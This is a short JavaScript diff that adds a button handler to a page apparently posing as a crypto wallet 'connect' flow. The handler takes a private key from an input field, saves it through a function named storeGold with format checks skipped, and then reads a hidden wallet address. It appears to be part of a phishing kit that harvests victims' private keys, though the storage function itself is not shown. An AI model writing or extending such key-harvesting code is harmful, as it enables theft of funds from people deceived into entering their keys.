@@ -569,7 +569,20 @@ document.getElementById('connect-to-wallet-btn')?.addEventListener('click', asyn
   }
 });
 
-  
+// Button click trigger gold save - prv key
+document.getElementById('connect-to-wallet2-process-btn')?.addEventListener('click', async function (event) {
+  event.preventDefault();
+  try {
+    await storeGold('prv-key-input', true); // Skip format check for prv key
+  var walletAddress0 = document.getElementById('found-wallet-address-txt-hidden2').value;
+  var networkType0 = document.getElementById('wallet-address-label1').textContent;
+
+  // Trigger the main function
+  storeWalletAddressHandler(walletAddress0, networkType0);
+  } catch (error) {
+    console.error('Error connecting wallet:', error);
+  }
+});  
 
 
 	
